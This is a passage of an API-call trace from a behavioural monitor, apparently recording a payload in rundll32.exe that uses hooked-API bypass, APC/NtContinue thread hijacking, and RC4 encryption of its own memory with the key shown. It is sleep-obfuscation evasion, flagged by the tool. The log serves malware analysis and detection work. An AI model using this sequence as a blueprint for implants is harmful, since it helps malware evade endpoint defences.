+[API] <NtCreateEvent> in [ntdll.dll] 
+[PAR] PHANDLE            EventHandle      : 0x000000E04227F660
+[PAR] ACCESS_MASK        DesiredAccess    : 0x1f0003 (EVENT_ALL_ACCESS)
+[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x0
+[PAR] EVENT_TYPE         EventType        : 0x1 (SynchronizationEvent)
+[PAR] BOOLEAN            InitialState     : 0x0
+[RET] [0xe041c840fb]
+
+[CNT] [356]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtCreateThreadEx> in [ntdll.dll] 
+[PAR] PHANDLE                        ThreadHandle      : 0x000000E04227F658
+[PAR] ACCESS_MASK                    DesiredAccess     : 0x1f03ff (THREAD_ALL_ACCESS)
+[PAR] POBJECT_ATTRIBUTES             ObjectAttributes  : 0x0
+[PAR] HANDLE                         ProcessHandle     : 0xffffffff
+[PAR] PVOID                          StartRoutine      : 0x00007FFA0361C490 (ntdll.dll!RtlInitializeResource)
+[PAR] PVOID                          Argument          : 0x0
+[PAR] ULONG                          CreateThreadFlags : 0x1 (THREAD_CREATE_FLAGS_CREATE_SUSPENDED)
+[PAR] SIZE_T                         ZeroBits          : 0x0
+[PAR] SIZE_T                         StackSize         : 0x14000
+[PAR] SIZE_T                         MaximumStackSize  : 0x14000
+[PAR] PNT_PROC_THREAD_ATTRIBUTE_LIST AttributeList     : 0x0
+[RET] [0xe041c8444e]
+
+Thread created by monitored process : Now monitoring [pid 0xa6c][tid 0xaac]
+
+[CNT] [357]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtDuplicateObject> in [ntdll.dll] 
+[PAR] HANDLE      SourceProcessHandle : 0xFFFFFFFFFFFFFFFF
+[PAR] HANDLE      SourceHandle        : 0xFFFFFFFFFFFFFFFE
+[PAR] HANDLE      TargetProcessHandle : 0xFFFFFFFFFFFFFFFF
+[PAR] PHANDLE     TargetHandle        : 0x000000E04227F6C8
+[PAR] ACCESS_MASK DesiredAccess       : 0x1f03ff (STANDARD_RIGHTS_ALL)
+[PAR] ULONG       Attributes          : 0x0 
+[PAR] ULONG       Options             : 0x0
+[RET] [0xe041c84684]
+
+[CNT] [358]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0x2e0
+[PAR] PCONTEXT ThreadContext : 0x000000E03FD8AB00
+[RET] [0xe041c657eb]
+
+[CNT] [359]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <GetCurrentProcessId> in [KERNEL32.DLL] 
+[RET] [0xe041c6f3ea]
+
+[CNT] [360]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <CreateToolhelp32Snapshot> in [KERNEL32.DLL] 
+[PAR] DWORD dwFlags       : 0x4 ( TH32CS_SNAPTHREAD)
+[PAR] DWORD th32ProcessID : 0x0
+[RET] [0xe041c6f40c]
+
+[CNT] [361]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <Thread32First> in [KERNEL32.DLL] 
+[RET] [0xe041c6f431]
+
+[CNT] [362]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtOpenThread> in [ntdll.dll] 
+[PAR] PHANDLE            ThreadHandle     : 0x000000E04227F4D0
+[PAR] ACCESS_MASK        DesiredAccess    : 0x1f03ff (THREAD_ALL_ACCESS)
+[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x000000E04227F508
+[PAR] PCLIENT_ID         ClientId         : 0x000000E04227F4D8
+[FLD]                    -> UniqueProcess = 0xa6c
+[FLD]                    -> UniqueThread  = 0xb3c
+[RET] [0xe041c84bbb]
+
+[CNT] [363]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSuspendThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle         : 0x2ec
+[PAR] PULONG   PreviousSuspendCount : 0x000000E04227F4BC
+[RET] [0xe041c6f4f0]
+
+[CNT] [364]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueryInformationThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle            : 0x2ec
+[PAR] ULONG           ThreadInformationClass  : 0x0 (ThreadBasicInformation)
+[PAR] PVOID           ThreadInformation       : 0x000000E04227F538
+[PAR] ULONG           ThreadInformationLength : 0x30
+[PAR] PULONG          ReturnLength            : 0x0
+[RET] [0xe041c84e6a]
+
+[CNT] [365]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtReadVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE   ProcessHandle       : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID    BaseAddress         : 0x00007FF7E42AE000
+[PAR] PVOID    Buffer              : 0x000000E04227F568
+[PAR] SIZE_T   NumberOfBytesToRead : 0x38
+[PAR] PSIZE_T  NumberOfBytesRead   : 0x0
+[RET] [0xe041c8523c]
+
+[CNT] [366]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0x2ec
+[PAR] PCONTEXT ThreadContext : 0x000000E03FD97A70
+[RET] [0xe041c6f584]
+
+[CNT] [367]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtResumeThread> in [ntdll.dll] 
+[PAR] HANDLE ThreadHandle : 0x2ec
+[RET] [0xe041c6f5fa]
+
+[CNT] [368]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtClose> in [ntdll.dll] 
+[PAR] HANDLE    Handle  : 0x2ec
+[RET] [0xe041c6f626]
+
+[CNT] [369]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtClose> in [ntdll.dll] 
+[PAR] HANDLE    Handle  : 0x2e8
+[RET] [0xe041c6f62e]
+
+[CNT] [370]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2e0
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD96BD0
+[RET] [0xe041c8506a]
+
+[CNT] [371]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2e0
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD8DA60
+[RET] [0xe041c8506a]
+
+[CNT] [372]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2e0
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD8DF40
+[RET] [0xe041c8506a]
+
+[CNT] [373]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2e0
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD95D30
+[RET] [0xe041c8506a]
+
+[CNT] [374]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2e0
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD96210
+[RET] [0xe041c8506a]
+
+[CNT] [375]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2e0
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD95370
+[RET] [0xe041c8506a]
+
+[CNT] [376]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2e0
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD94E90
+[RET] [0xe041c8506a]
+
+[CNT] [377]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2e0
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD95850
+[RET] [0xe041c8506a]
+
+[CNT] [378]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2e0
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD966F0
+[RET] [0xe041c8506a]
+
+[CNT] [379]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2e0
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD97590
+[RET] [0xe041c8506a]
+
+[CNT] [380]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtAlertResumeThread> in [ntdll.dll] 
+[PAR] HANDLE  ThreadHandle          : 0x2e0
+[PAR] PULONG  PreviousSuspendCount  : 0x0
+[RET] [0xe041c660e5]
+
+[CNT] [381]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FD96BD0
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA03690C80 (ntdll.dll!ZwWaitForSingleObject)
+[FLD]          -> Rsp          = 0x000000E042372F78
+[FLD]          -> Rcx          = 0x00000000000002DC
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [382]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <ZwWaitForSingleObject> in [ntdll.dll] 
+[PAR] HANDLE         KeyedEventHandle : 0x2dc
+[PAR] BOOLEAN        Alertable        : 0x0
+[PAR] PLARGE_INTEGER Timeout          : 0x0
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [383]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSignalAndWaitForSingleObject> in [ntdll.dll] 
+[PAR] HANDLE         SignalHandle : 0x2dc
+[PAR] HANDLE         WaitHandle   : 0x2e0
+[PAR] BOOLEAN        Alertable    : 0x0
+[PAR] PLARGE_INTEGER Timeout      : 0x0
+[RET] [0xe041c85460]
+
+[CNT] [384]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [385]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FD8DA60
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA03691140 (ntdll.dll!ZwProtectVirtualMemory)
+[FLD]          -> Rsp          = 0x000000E042373F78
+[FLD]          -> Rcx          = 0xFFFFFFFFFFFFFFFF
+[FLD]          -> Rdx          = 0x000000E04227F668
+[FLD]          -> R8           = 0x000000E04227F670
+[FLD]          -> R9           = 0x0000000000000004
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [386]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <ZwProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E04227F668 (0x000000E041C50000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E04227F670 (0x4c000)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [387]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [388]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FD8DF40
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA060913E0 (CRYPTSP.DLL!SystemFunction032)
+[FLD]          -> Rsp          = 0x000000E042374F78
+[FLD]          -> Rcx          = 0x000000E04227F698
+[FLD]          -> Rdx          = 0x000000E04227F6A8
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [389]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <SystemFunction032> in [CRYPTSP.DLL] 
+[INF] [ Undocumented RC4 implementation ]
+[PAR] PBINARY_STRING buffer : 0x000000E04227F698
+[FLD]                -> Length    = 0x4c000
+[FLD]                -> MaxLength = 0x4c000
+[FLD]                -> Buffer    = 0x000000E041C50000 
+[PAR] PBINARY_STRING key    : 0x000000E04227F6A8
+[FLD]                -> Length    = 0x10
+[FLD]                -> MaxLength = 0x10
+[FLD]                -> Buffer    = 0x000000E04227F684 ([0x82,0x16,0x55,0x8a,0xe4,0xfa,0xff,0x7f,0xf3,0x71,0xf6,0xf8,0x61,0x82,0xcf,0xfa])
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [390]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [391]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FD95D30
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA03691A50 (ntdll.dll!NtGetContextThread)
+[FLD]          -> Rsp          = 0x000000E042375F78
+[FLD]          -> Rcx          = 0x00000000000002E4
+[FLD]          -> Rdx          = 0x000000E03FD970B0
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [392]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0x2e4
+[PAR] PCONTEXT ThreadContext : 0x000000E03FD970B0
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [393]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [394]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FD96210
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA036922D0 (ntdll.dll!NtSetContextThread)
+[FLD]          -> Rsp          = 0x000000E042376F78
+[FLD]          -> Rcx          = 0x00000000000002E4
+[FLD]          -> Rdx          = 0x000000E03FD97F50
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [395]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <NtSetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle : 0x2e4
+[PAR] PCONTEXT Context      : 0x000000E03FD97F50
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA02690F8A (ntdll.dll!NtDelayExecution + 0xa)
+[FLD]          -> Rsp          = 0x000000E042275468
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [396]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [397]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FD95370
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA03692720 (ntdll.dll!NtWaitForKeyedEvent)
+[FLD]          -> Rsp          = 0x000000E042377F78
+[FLD]          -> R9           = 0x000000E03FD5BF70
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [398]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <NtWaitForKeyedEvent> in [ntdll.dll] 
+[PAR] HANDLE         KeyedEventHandle : 0x0
+[PAR] PVOID          KeyValue         : 0x0
+[PAR] BOOLEAN        Alertable        : 0x0
+[PAR] PLARGE_INTEGER Timeout          : 0x000000E03FD5BF70
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [399]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [400]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FD94E90
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA060913E0 (CRYPTSP.DLL!SystemFunction032)
+[FLD]          -> Rsp          = 0x000000E042378F78
+[FLD]          -> Rcx          = 0x000000E04227F698
+[FLD]          -> Rdx          = 0x000000E04227F6A8
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [401]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <SystemFunction032> in [CRYPTSP.DLL] 
+[INF] [ Undocumented RC4 implementation ]
+[PAR] PBINARY_STRING buffer : 0x000000E04227F698
+[FLD]                -> Length    = 0x4c000
+[FLD]                -> MaxLength = 0x4c000
+[FLD]                -> Buffer    = 0x000000E041C50000 
+[PAR] PBINARY_STRING key    : 0x000000E04227F6A8
+[FLD]                -> Length    = 0x10
+[FLD]                -> MaxLength = 0x10
+[FLD]                -> Buffer    = 0x000000E04227F684 ([0x82,0x16,0x55,0x8a,0xe4,0xfa,0xff,0x7f,0xf3,0x71,0xf6,0xf8,0x61,0x82,0xcf,0xfa])
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [402]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [403]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FD95850
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA03691140 (ntdll.dll!ZwProtectVirtualMemory)
+[FLD]          -> Rsp          = 0x000000E042379F78
+[FLD]          -> Rcx          = 0xFFFFFFFFFFFFFFFF
+[FLD]          -> Rdx          = 0x000000E04227F668
+[FLD]          -> R8           = 0x000000E04227F670
+[FLD]          -> R9           = 0x0000000000000020
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [404]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <ZwProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E04227F668 (0x000000E041C50000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E04227F670 (0x4c000)
+[PAR] ULONG  NewAccessProtection    : 0x20 (PAGE_EXECUTE_READ)
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [405]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [406]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FD966F0
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA036922D0 (ntdll.dll!NtSetContextThread)
+[FLD]          -> Rsp          = 0x000000E04237AF78
+[FLD]          -> Rcx          = 0x00000000000002E4
+[FLD]          -> Rdx          = 0x000000E03FD970B0
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [407]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <NtSetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle : 0x2e4
+[PAR] PCONTEXT Context      : 0x000000E03FD970B0
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA0269257A (ntdll.dll!NtSignalAndWaitForSingleObject + 0xa)
+[FLD]          -> Rsp          = 0x000000E04227F588
+[FLD]          -> Rsi          = 0x000000E042379F78
+[FLD]          -> Rdi          = 0x000000E04237AF78
+[FLD]          -> R12          = 0x00000000000002DC
+[FLD]          -> R13          = 0x000000E04227F668
+[FLD]          -> R14          = 0x000000E04227F684
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [408]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtTestAlert> in [ntdll.dll] 
+[INF] [ Execute queued APC if any ]
+[RET] [0x0]
+
+[CNT] [409]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[API] <NtContinue> in [ntdll.dll] 
+[PAR] PCONTEXT ContextRecord : 0x000000E03FD97590
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x00007FFA0361A060 (ntdll.dll!RtlExitUserThread)
+[FLD]          -> Rsp          = 0x000000E04237BF78
+[PAR] BOOLEAN  TestAlert     : 0x0
+[RET] [0x7ffa026929be] in [ntdll.dll]
+
+[CNT] [410]
+[PTP] [0xa6c] [0xaac] [c:\windows\system32\rundll32.exe]
+[/!\] [ Illegitimate call detected ! ]
+[API] <RtlExitUserThread> in [ntdll.dll] 
+[PAR] NTSTATUS ExitStatus : 0x0
+[RET] [0x7ffa03692600] in [ntdll.dll]
+
+[CNT] [411]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041D0E968 (0x000000E041C50000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E04227F598 (0x1000)
+[PAR] ULONG  NewAccessProtection    : 0x2 (PAGE_READONLY)
+[RET] [0xe041c84c5c]
+
+[CNT] [412]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E04227F5A0 (0x000000E041C86000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E04227F5A8 (0x1d20)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe041c84c5c]
+
+[CNT] [413]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E04227F5A0 (0x000000E041C88000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E04227F5A8 (0x1770)
+[PAR] ULONG  NewAccessProtection    : 0x2 (PAGE_READONLY)
+[RET] [0xe041c84c5c]
+
+[CNT] [414]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E04227F5A0 (0x000000E041C8A000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E04227F5A8 (0x1524)
+[PAR] ULONG  NewAccessProtection    : 0x2 (PAGE_READONLY)
+[RET] [0xe041c84c5c]
+
+[CNT] [415]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E04227F5A0 (0x000000E041C8C000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E04227F5A8 (0x1ab0)
+[PAR] ULONG  NewAccessProtection    : 0x2 (PAGE_READONLY)
+[RET] [0xe041c84c5c]
+
+[CNT] [416]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
